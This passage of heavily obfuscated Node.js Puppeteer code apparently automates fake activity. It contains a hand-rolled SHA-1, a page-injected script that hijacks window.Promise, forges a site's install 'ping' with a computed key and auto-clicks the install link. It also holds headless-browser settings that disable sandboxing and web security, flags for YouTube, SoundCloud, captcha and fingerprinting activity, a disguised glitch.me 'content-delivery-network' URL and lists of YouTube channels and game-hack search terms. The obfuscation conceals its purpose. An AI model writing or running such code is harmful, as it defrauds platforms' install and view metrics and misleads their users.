-0x5 * -0x81d & -0xa05 + -0xef9 + 0x47 * 0x5b) << y[0x2233 + 0x4 * 0x84f + -0x436c & N++], P[N >> -0x1fd0 + -0x529 * 0x1 + 0x24fb] |= (-0x1f * -0x6f + 0x7f * -0x46 + -0x21 * -0xa9 | L >> -0x1 * -0x2009 + -0x1dcb + -0x2 * 0x11c & -0x711 + 0x4bd * -0x2 + 0x10ca) << y[-0x1cfb + 0x14d7 + 0x827 & N++], P[N >> 0x1022 + -0xfc9 + -0x3 * 0x1d] |= (-0x1a1e + -0x25e5 + -0xce7 * -0x5 | -0x9a5 + 0xc8b * 0x1 + 0x61 * -0x7 & L) << y[-0x5b1 + -0x1b85 * 0x1 + 0x2139 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x4 * -0x2a2 + -0xa8a + 0x42 ? (this['block'] = P[0x1ef6 + -0x205e + 0x178], this['start'] = N - (-0x2324 + -0x2 * -0x3d2 + -0x2 * -0xde0), this['hash'](), this['hashed'] = -0x65 * -0x3 + -0x6 * 0xa3 + 0x152 * 0x2) : this['start'] = N;
                }
                return this['bytes'] > -0x30cd * 0x37eac + -0x7f6df9cc + 0x229faa987 && (this['hBytes'] += this['bytes'] / (0x26166e9c + 0x15fc7e6d8 + -0x2 * 0x42ef2aba) << -0x349 * -0xa + -0xead + 0x122d * -0x1, this['bytes'] = this['bytes'] % (0x1e6f9bd24 + 0x7bae * -0xbe2 + -0xe13c1388)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x56b * -0x1 + 0xa + 0x562;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1296 + -0x195e + 0x6d8] = this['block'], J[K >> -0xbcc + 0xcb * 0x2c + -0xc5 * 0x1e] |= x[-0xd * 0x125 + 0x2 * -0xd1f + 0x2922 & K], this['block'] = J[-0xf0a + 0x3 * -0x6f1 + -0x11 * -0x21d], K >= 0x1e2c + -0x72e * -0x4 + 0x4 * -0xeab && (this['hashed'] || this['hash'](), J[-0x154b * -0x1 + 0x13a9 + -0x4 * 0xa3d] = this['block'], J[-0x1 * -0x11c4 + 0x1176 + -0x2 * 0x1195] = J[0x128 * -0x11 + -0x1 * -0x13cb + -0x2 * 0x11] = J[-0x2473 + -0x4 * -0x109 + -0x1 * -0x2051] = J[-0x621 + 0x4f * 0x35 + -0x5 * 0x20b] = J[-0x1720 + 0x1c39 + -0x515] = J[0xcdc * -0x2 + -0x1 * -0x22f3 + -0x936] = J[-0x654 + 0x21f * -0x8 + -0xa * -0x255] = J[0x15b0 + -0x2637 + 0x108e] = J[0x2587 + 0x15cf + -0x3b4e] = J[0x1 * -0xc61 + -0x119d + 0x1e07] = J[-0x2d1 + -0x2177 * -0x1 + -0x1e9c] = J[-0xeb * 0x25 + -0x14 * 0x59 + 0x31 * 0xd6] = J[-0x296 * 0x3 + 0x45e + 0x370] = J[0x1f0 + -0x170f + 0x152c * 0x1] = J[-0x17 * 0x133 + -0xcff * 0x1 + 0x28a2] = J[-0x2173 + 0x1252 + 0xf30] = -0xb * -0x22a + 0x1b53 + -0x3321), J[0x1954 + -0x431 * 0x9 + 0xc73] = this['hBytes'] << 0x4f2 * -0x4 + 0x14fd + -0x132 | this['bytes'] >>> 0x32 * 0x6f + 0x227f + -0x3810, J[-0x25 * 0x4f + 0x931 * 0x2 + -0x6e8] = this['bytes'] << 0x2230 + 0x1867 + 0x28c * -0x17, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x108c + -0x1d26 + 0x2 * 0x655; J < 0x158e + 0x1e09 * 0x1 + -0x3347; ++J)
                K = Q[J - (-0xa29 + 0x18d4 * -0x1 + 0x2300)] ^ Q[J - (-0x1 * -0x11f1 + 0x5fc * -0x5 + 0xc03)] ^ Q[J - (-0x1 * 0x921 + 0x914 + 0x1b)] ^ Q[J - (-0x113a + 0xa60 + 0x6ea)], Q[J] = K << 0x49 * 0xb + 0x1b2 * 0x13 + -0x2358 | K >>> -0xb12 + -0x14aa + 0x7 * 0x48d;
              for (J = 0xe * -0x9a + -0xfb * 0x12 + 0x1a12; J < 0x1 * -0x163f + -0x1337 * 0x2 + 0x3cc1; J += -0xd96 + -0x11 * 0xfe + 0x1d * 0x10d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x425 + -0x2403 * -0x1 + -0x2823 | L >>> 0x264d + 0x1 * -0x1cdb + -0x3 * 0x31d) + (M & N | ~M & O) + P + (0x10f * 0x33adcb + 0x21c69e * 0x12 + 0x85b6226 * 0x4) + Q[J] << 0x14e8 + 0x6 * -0x277 + -0x61e) << 0x1 * -0x1e07 + -0x2638 + 0x4444 | P >>> 0x9 * 0x274 + 0x27e + -0x1877) + (L & (M = M << -0x21fc + 0x172e + 0xaec | M >>> 0x2 * 0x1087 + -0x1 * 0x9c1 + -0x174b) | ~L & N) + O + (0x1ca7ff65 + 0x4c8b68be + -0xeb0ee8a) + Q[J + (0x728 + 0x22aa + -0x29d1)] << 0x1a87 * -0x1 + 0x17 * 0x139 + 0x8 * -0x33) << 0x87c + 0x39b * 0x2 + -0xfad | O >>> 0x9b * 0x16 + -0x937 + -0x100 * 0x4) + (P & (L = L << -0x1ce5 + 0x2393 + 0x150 * -0x5 | L >>> -0x209a + 0xdcd + 0x12cf) | ~P & M) + N + (-0x1cf * 0x224123 + -0x61 * 0x6b39ad + -0xc19d * -0xff4f) + Q[J + (-0x22ac + -0x1aa5 + 0x3d53)] << 0x1fd7 + -0x1582 + -0x5 * 0x211) << -0xd * -0x2de + 0x2c5 * -0x9 + 0x20e * -0x6 | N >>> 0x255 * 0x5 + -0x535 + -0x659) + (O & (P = P << -0x7 * 0x18d + 0x860 + 0x23 * 0x13 | P >>> 0xd80 + 0x83a + -0x15b8) | ~O & L) + M + (-0x4d7aa148 + 0x3bd5 * 0x1f39 + -0xdb084 * -0xbbd) + Q[J + (0x3b * -0xd + -0x1360 + -0x5 * -0x47a)] << -0x1287 + -0x777 * 0x4 + 0x3063) << 0x221a + 0x2 * -0x1b5 + -0x1eab | M >>> -0x25c2 * 0x1 + 0x4d5 * -0x1 + 0xa * 0x445) + (N & (O = O << 0x1dea + 0x12dd + 0x1 * -0x30a9 | O >>> -0x15a * 0xe + -0x2a7 + 0x1595) | ~N & P) + L + (-0x2411ea3a + 0x1 * 0x2fab94c4 + 0x4ee8cf0f) + Q[J + (0x96b * 0x3 + 0x11c0 + -0x2dfd)] << -0x59f * 0x4 + -0x921 + 0x1f9d, N = N << -0x2 * -0x5ab + -0x2383 * 0x1 + 0x819 * 0x3 | N >>> -0x1 * 0x1315 + 0x117f * -0x1 + 0x1 * 0x2496;
              for (; J < 0x92e + -0x42 * 0x88 + -0x1 * -0x1a0a; J += -0x77c * -0x2 + 0x9dd * -0x3 + -0x752 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x13cf + 0x33b * -0xa + -0x1 * -0xc84 | L >>> -0x1 * -0x157f + 0x25f3 + -0x1 * 0x3b57) + (M ^ N ^ O) + P + (-0x2a7bc54 * -0x43 + -0x7c8de4 * 0xa7 + 0xe343161) + Q[J] << 0x639 + -0x1333 + 0xcfa) << 0x25 * 0x51 + -0x1 * -0x1721 + -0x22d1 * 0x1 | P >>> -0x2b * 0xca + 0x316 * -0x2 + 0x2835) + (L ^ (M = M << 0xa62 + 0x26f1 + -0x3135 | M >>> -0x7b1 * -0x1 + -0x201b * 0x1 + 0x186c) ^ N) + O + (0xd61d0dcd + 0x2ea3 * -0x2bd75 + 0x18868553) + Q[J + (0x1 * 0x1ac7 + -0x1cfe + 0x238)] << 0x65 * -0x47 + -0x3 * -0x6e1 + 0x760) << 0x414 * 0x1 + 0x25c1 * -0x1 + 0x21b2 | O >>> 0x7eb * -0x1 + -0x3 * 0x9e3 + 0x36d * 0xb) + (P ^ (L = L << 0x198b * 0x1 + 0x96 * 0x1a + 0x28a9 * -0x1 | L >>> -0x1a5 * 0x1 + -0x4cb + 0x672) ^ M) + N + (0xa4000bf0 + 0x6d6883 * 0xd + 0x6 * -0x9c8bd29) + Q[J + (-0x54 * -0x6c + 0x97 * -0x10 + -0x3 * 0x8aa)] << -0xb84 + -0x15b * -0xd + -0x209 * 0x3) << 0x1f28 + 0x90 * -0x18 + -0x11a3 | N >>> 0x7a2 * -0x2 + -0x59a + 0x7 * 0x2ff) + (O ^ (P = P << -0x1543 + -0x3 * -0x611 + 0x2 * 0x197 | P >>> 0x1 * 0x123b + -0x13a + -0x10ff) ^ L) + M + (0x102ea2f * -0x71 + -0x1cbd2e48 + 0xfde078a8) + Q[J + (0x37b * -0x3 + 0x1f01 * 0x1 + 0x1 * -0x148d)] << 0x1ba2 + 0xb1e + -0x26c0) << 0x2dd * -0x4 + -0x2108 + 0x2c81 | M >>> -0x3d * 0x92 + -0xacd * 0x1 + 0x2db2) + (N ^ (O = O << 0x14 * 0xa7 + 0x61 * -0x1f + -0x65 * 0x3 | O >>> 0x10f2 + -0x1 * -0x20fc + -0xb4 * 0x47) ^ P) + L + (-0x1e758e42 + -0xaa02badf + -0xedfe7 * -0x14ee) + Q[J + (0x2681 + 0x277 * 0xd + -0xf4 * 0x4a)] << -0xc0b * 0x3 + -0x23e3 + 0x4804, N = N << -0x3 * -0x611 + 0x1 * -0x1a35 + 0x820 | N >>> 0x134d + 0xd76 + -0x27 * 0xd7;
              for (; J < -0x4c7 + -0x13b4 + -0x18b7 * -0x1; J += -0x8fd + 0x79 * 0x51 + -0x1d47 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x191d + 0x4e * -0x2d + -0xb62 | L >>> 0x917 + -0xe3 + -0x819) + (M & N | M & O | N & O) + P - (-0x232f9e34 + -0x1 * 0xd5ec25c8 + 0x16a000720) + Q[J] << -0x1 * 0xe16 + -0xcbb + -0x1ad1 * -0x1) << 0xae * 0x9 + 0x18f3 + 0x1f0c * -0x1 | P >>> 0x81 + 0x217b + -0x21e1) + (L & (M = M << 0x10d3 + -0x7 * -0x33b + -0x2752 | M >>> -0x2 * -0x88a + -0x1c77 + 0x1 * 0xb65) | L & N | M & N) + O - (0xb28983ce + 0x10 * 0x4f40a5c + 0x4872f335 * -0x2) + Q[J + (0x247 + 0x2 * -0x394 + 0x4e2)] << -0x49 * -0x59 + 0x1 * -0x3e3 + -0x157e) << -0x14cd + -0x16e3 + 0x2bb5 * 0x1 | O >>> -0x1b25 * -0x1 + 0x1 * 0x493 + 0x1 * -0x1f9d) + (P & (L = L << 0x9 * -0xea + 0x14b * -0xd + 0x1927 | L >>> 0xfa * -0x19 + 0x1 * -0xc22 + 0x1 * 0x248e) | P & M | L & M) + N - (0xce8481bb + -0x4689fc4 * -0x2 + -0x31ab63f * 0x21) + Q[J + (-0x3 * -0x40f + -0x399 * -0x3 + 0x1 * -0x16f6)] << -0x5a4 + 0x1d6f + -0x17cb) << -0x8 * -0xe8 + 0x73e * -0x3 + 0xe7f | N >>> 0xcb3 + 0x1063 + -0x1cfb) + (O & (P = P << 0xbb5 + 0x7 * 0x8f + -0xf80 | P >>> -0x1637 + -0x35f + 0x1998) | O & L | P & L) + M - (-0xdcc7d40b + 0xbc53a82f * -0x1 + 0x209ffbf5e) + Q[J + (0x1 * 0x5da + -0x123f + 0xc68)] << -0x1 * -0xfdd + -0x12c3 + 0x2e6) << -0x17c5 + -0xca * 0x1 + -0xc4a * -0x2 | M >>> -0x5b * -0x64 + -0x1f45 + 0xc * -0x59) + (N & (O = O << -0x1 * -0xf64 + 0x9c1 + -0x95 * 0x2b | O >>> -0x1 * -0x6d9 + -0x2d6 + -0x1 * 0x401) | N & P | O & P) + L - (-0x9a41fc9a + 0x6e0456a + -0x3d3da45 * -0x44) + Q[J + (-0x149e + 0x7f * 0xb + -0x103 * -0xf)] << -0x1 * -0x21a7 + -0x1cc7 + -0x4e0, N = N << 0x613 + 0x1e13 * 0x1 + -0x2408 | N >>> -0x1328 + 0x1 * 0x1fcb + -0xca1;
              for (; J < -0x11be + -0x63d + -0x3 * -0x819; J += -0xb36 + 0x26d5 + -0x1b9a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x811 + -0x103 * 0x10 + -0x1846 * -0x1 | L >>> -0x239c + 0x1 * 0x181d + 0xb9a) + (M ^ N ^ O) + P - (0x1 * 0x5871d067 + -0x636ab050 + 0x40961e13) + Q[J] << 0x1498 + 0x3 * 0x9d7 + -0x321d * 0x1) << 0x722 * 0x4 + -0x389 * 0xb + 0xa60 | P >>> -0xa4b + 0x2b * 0x5 + 0x1 * 0x98f) + (L ^ (M = M << -0x8 * -0xbf + -0x2a8 + 0x1 * -0x332 | M >>> -0xd17 + 0x5c * -0x12 + 0x1391 * 0x1) ^ N) + O - (-0x4 * 0x3c85a43 + -0x82a39ea + 0x4ce8e120) + Q[J + (-0x7e1 * -0x1 + 0x36 * 0x2b + 0x1e2 * -0x9)] << 0x2071 + -0x2378 + 0x5 * 0x9b) << -0x949 + 0x20aa + -0x1cc * 0xd | O >>> 0xde + 0x717 + 0xc9 * -0xa) + (P ^ (L = L << -0x178c + -0x228b + -0x1 * -0x3a35 | L >>> 0xaee * 0x2 + -0xe47 + 0x115 * -0x7) ^ M) + N - (-0x38c6c13 * 0x13 + -0x5addca6f + 0xd3e70e02) + Q[J + (0x116 * -0x2 + -0x4 * 0x1dd + -0x336 * -0x3)] << -0x676 + -0xb5a * -0x2 + -0x103e) << -0x1306 + 0x17d6 + -0x4cb | N >>> -0x21ef + -0x1 * -0x1ace + 0x73c) + (O ^ (P = P << 0x2 * -0x10c7 + -0x1a17 * 0x1 + 0x3bc3 | P >>> 0x3 * 0xf + -0x2 * 0x7c7 + 0xf63) ^ L) + M - (-0x5a70dff6 * 0x1 + 0x27b * 0x722d5 + 0x7e5ab7c9) + Q[J + (0x5fe + 0xe5f + -0x145a)] << 0x7df + 0xc60 + 0x143f * -0x1) << 0xb * 0x263 + -0x24ec + 0xab0 | M >>> 0x668 + -0x3cd + 0x40 * -0xa) + (N ^ (O = O << 0xe3c + -0x85 + -0xd99 | O >>> -0x1583 * -0x1 + -0x1 * 0x1f77 + -0x22 * -0x4b) ^ P) + L - (-0x4eb6b125 + 0x6a48b9 + 0x83e9a696) + Q[J + (-0x17 * -0xca + 0x462 + -0x1684)] << -0x1181 + 0x2a1 * 0x2 + 0x21 * 0x5f, N = N << -0x1204 + -0x805 + 0x1a27 | N >>> 0x8d * -0x44 + -0x1880 + 0x3df6;
              this['h0'] = this['h0'] + L << -0xb * 0x339 + 0x9 * 0x23b + 0xf60, this['h1'] = this['h1'] + M << -0x775 + 0xace + -0x359, this['h2'] = this['h2'] + N << 0x3 * -0x9df + -0x16ae * 0x1 + -0x4c1 * -0xb, this['h3'] = this['h3'] + O << -0x343 * 0x5 + 0x5 * -0x58c + 0x2c0b, this['h4'] = this['h4'] + P << 0x2665 * 0x1 + -0x19 * -0xd7 + -0x3b64;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x35 * -0x8f + -0xabf + 0x2876 & -0xbbf * -0x1 + -0x13d7 + 0x827 * 0x1] + w[J >> 0x16f0 + -0x2a1 * -0xc + -0x3664 & 0x13 * 0xca + -0x82d * 0x1 + 0xa * -0xad] + w[J >> 0x15ed + 0x61b + -0x1bf4 & -0x59d * -0x6 + -0x3 * -0x159 + 0xc8e * -0x3] + w[J >> 0x1828 + 0x34d + -0x1b65 & 0xa72 + 0x1 * -0x123 + -0x250 * 0x4] + w[J >> 0xff5 + -0x4 * -0x3ce + -0x1f21 & -0x1244 + 0xc66 + 0x1 * 0x5ed] + w[J >> -0x515 * -0x2 + -0x11 * -0x1bf + -0x27d1 & 0x173e + 0x2011 * -0x1 + 0x8e2] + w[J >> -0x2148 + -0x1 * 0x17b3 + -0x1 * -0x38ff & 0x195b * 0x1 + 0x123 * 0x1f + -0x3c89] + w[0x19d * 0x14 + 0xd * -0xf7 + -0x13aa & J] + w[K >> 0x2564 + 0x17ed + -0x3 * 0x1467 & -0x70 * 0x1 + -0x2 * 0x146 + -0x30b * -0x1] + w[K >> 0x16ef + -0x161f + -0x2 * 0x5c & 0xac3 + 0x1 * 0x1cd + 0x21 * -0x61] + w[K >> -0xe0f + 0x49 * -0x33 + 0x1cae & 0x1c9b + 0x1f6f + 0x3bfb * -0x1] + w[K >> 0x42d + -0x227d + 0xd8 * 0x24 & 0x116d + 0x7c * -0x19 + -0x542 * 0x1] + w[K >> 0x18bf + -0x1a5b + 0x1a8 & 0x1 * -0x76 + 0x215c + -0x20d7 * 0x1] + w[K >> -0x24f7 * -0x1 + 0x1 * 0x1cf1 + -0x41e0 & 0x32e + 0x5 * -0x49d + 0x13f2] + w[K >> -0x423 + 0xd95 * -0x1 + -0x1c6 * -0xa & 0x2317 + -0xf8a + 0x137e * -0x1] + w[0x1d95 + 0x239c + -0x4122 & K] + w[L >> 0x1 * 0xbe4 + 0x28 * -0xef + 0x664 * 0x4 & -0x1 * 0xad9 + -0x658 + -0x30 * -0x5c] + w[L >> -0x15f * -0x3 + -0x1ca1 + -0x3c * -0x69 & 0x11 * 0x5e + -0x1035 + 0xa06] + w[L >> 0x6 * -0x283 + -0x1e1f * -0x1 + -0xef9 & 0x139 * -0x1 + 0x196b * 0x1 + -0x1823] + w[L >> -0x21c5 + -0x1624 + -0x7ff * -0x7 & -0x15c6 + 0xbe6 * 0x2 + -0x1f7] + w[L >> 0x1f7b * -0x1 + -0xd * 0x2d9 + 0x448c & -0xd74 * 0x1 + -0x2170 + 0x65 * 0x77] + w[L >> 0x1 * 0x1468 + 0x1b79 + -0xff3 * 0x3 & -0xba3 * 0x3 + 0x2 * -0xe3 + 0x24be] + w[L >> 0x2fe + 0x1b0b + -0x1d * 0x109 & -0x1710 + -0x1f * 0x34 + -0x1bb * -0x11] + w[-0x1817 + -0xeb3 * 0x2 + 0x358c & L] + w[M >> -0x182e + -0x1 * -0x1cea + -0x4a0 & 0x26ea + 0x851 * 0x1 + -0x2f2c] + w[M >> 0xe43 + 0x8bb + -0x16e6 & 0x1 * -0x75d + -0x1 * -0x2a1 + 0x4cb] + w[M >> 0x1a3 * 0x2 + 0x1c * -0x14c + 0x211e & -0x1da + 0x23aa + -0x21c1 * 0x1] + w[M >> 0x1 * -0x18d4 + 0x7f + 0x1865 & -0x24 * -0x44 + 0x476 * -0x5 + 0xccd] + w[M >> -0x20b0 * -0x1 + -0x19 * -0x107 + 0xed * -0x3f & -0x14cd + 0x6 * 0x571 + 0x1 * -0xbca] + w[M >> 0x19b7 + -0x173f + 0x4 * -0x9c & 0x16db * 0x1 + 0x2163 + 0x382f * -0x1] + w[M >> 0x26b3 + -0x1 * -0x2032 + -0x46e1 & -0x87d + 0x20c2 + -0x1836] + w[-0x1 * -0x15c9 + 0xacb + -0x39d * 0x9 & M] + w[N >> -0x15fc + 0x1 * 0x1e86 + 0xa6 * -0xd & -0x791 + -0x120b * -0x2 + 0x1 * -0x1c76] + w[N >> 0x10bc + -0x1dc2 + 0xd1e & -0x28a + -0x20ed + 0x2386] + w[N >> 0xd * -0x11 + -0x52f * 0x4 + 0x15ad & 0x1 * -0x1c3b + 0x2150 + -0x506] + w[N >> -0x5e8 + 0x6 * -0x4 + 0x610 & -0x230 + 0x15fc + -0x13bd] + w[N >> -0x1 * 0x3a3 + 0x349 * -0x6 + -0x71 * -0x35 & 0x1e54 + -0x15 * -0x3f + -0x2370] + w[N >> 0x2 * -0x79 + -0x138d + 0x1487 & -0x3 * 0x9c4 + 0x602 * 0x1 + -0x1759 * -0x1] + w[N >> 0x24 * -0x84 + -0x22d * -0xe + -0xbe2 & 0x1a03 * -0x1 + -0x4c4 + 0x1ed6] + w[0x1b59 + 0xab6 + -0x1 * 0x2600 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x7 * -0x1b4 + -0x4 * -0x1d9 + 0x25 * 0x20 & -0x4 * -0x2e9 + 0x2c8 + -0xd6d,
                J >> -0x75 * -0x25 + 0x2a * -0xce + 0x10f3 & 0x35 * -0x2b + 0xc31 + -0x24b,
                J >> 0x7ae * -0x3 + -0x8e * -0x34 + 0x1 * -0x5c6 & -0xd5c * 0x2 + -0x1c * 0x2 + 0x1 * 0x1bef,
                0x751 + -0x233 * 0x5 + 0x4ad & J,
                K >> 0x235b + 0x739 + -0x2a7c & -0x7 * 0x4f6 + -0x1 * -0x20fb + -0x2 * -0x15f,
                K >> 0x2222 * -0x1 + 0x1c64 + 0x5ce & 0x2597 + -0xa7c + -0xc * 0x22d,
                K >> -0x5f * -0x1d + 0x23ea + -0x2ea5 & 0x6 * 0x2 + -0x2145 + -0xb68 * -0x3,
                0xf * -0x17e + -0xd77 * 0x1 + 0x24d8 & K,
                L >> 0x1c82 + 0x142f + -0x3099 & 0xa14 + 0x1 * 0x12df + -0x1bf4,
                L >> 0x1634 + -0xcf7 + 0x3 * -0x30f & 0x5 * -0x7ae + 0x3 * 0x7eb + -0x34 * -0x4d,
                L >> 0x1c3 * 0x8 + -0x242 + -0xbce & 0x2570 + 0x215b * 0x1 + -0x45cc,
                0x14ef + -0x1caa + 0x8ba & L,
                M >> 0x1215 + -0x13 * 0x197 + 0xc38 & 0xd13 + -0x2 * 0x9e2 + 0x29 * 0x30,
                M >> -0x9 * -0xb0 + 0xd78 + -0x1398 & -0x12ad + 0x31 * 0x6b + -0x45 * 0x3,
                M >> 0x1847 + -0x1 * 0x1583 + -0xe * 0x32 & -0x266b + 0x161d + -0x1 * -0x114d,
                -0x26bb + -0x84e * 0x1 + -0xd4 * -0x3a & M,
                N >> 0x20df + -0x7 * 0x554 + 0x485 & 0x84c + -0xd * 0x187 + 0x647 * 0x2,
                N >> -0x1 * 0x5c5 + -0x20ab * 0x1 + 0x2680 & 0xa60 + 0x136 * 0x2 + -0xbcd,
                N >> 0x5 * 0x5e + -0x311 + -0x143 * -0x1 & -0x2094 * -0x1 + 0x1a0f * 0x1 + 0x83c * -0x7,
                -0xa74 + -0x2 * -0xfbb + -0x1403 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x20bd + -0x25c9 + 0x469a), (K = new DataView(J))['setUint32'](0x42c + -0x83c * -0x1 + -0xc68, this['h0']), K['setUint32'](-0x1bf3 + 0x3d3 + 0x1824, this['h1']), K['setUint32'](-0x3bf + 0x2 * 0x789 + -0xb4b, this['h2']), K['setUint32'](-0x16bc + -0x1375 * -0x1 + -0x17 * -0x25, this['h3']), K['setUint32'](-0x25a + -0x7f0 + 0x35 * 0x32, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x61a + -0x5d * 0x25 + 0x1 * 0x138b];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1f62 + 0x2f * 0x5d + 0xe4f;
            J[-0x1f39 + 0x18d9 + 0x88 * 0xc]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x93d + -0x1 * -0x2639 + -0x1cfc] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0xc9 * 0x11 + -0x17b2 + 0xa5a), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x6b * 0x3e + 0x8b7 * -0x3 + -0x3c * -0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x20b * -0x7 + -0x1253 + 0x9e2), Promise['resolve'](-0x7 * 0x592 + -0x100 * -0x2 + -0x7b * -0x4d);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x16 * -0xf9 + 0x19 * 0x8f + 0xb * -0x337; j < 0x1d * -0xa6 + -0x546 + 0x1815; j++)
    i();
}
const NETWORK_PATIENCE = 0x1e4f + -0x1e93 * -0x2 + -0x3c35 + (0x786 + -0x25 * -0xe5 + -0x421 * 0x7) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1c0a * 0x1 + 0x177f + 0x48e) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0xdc4 + 0x653 * 0x2 + 0x11e; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + 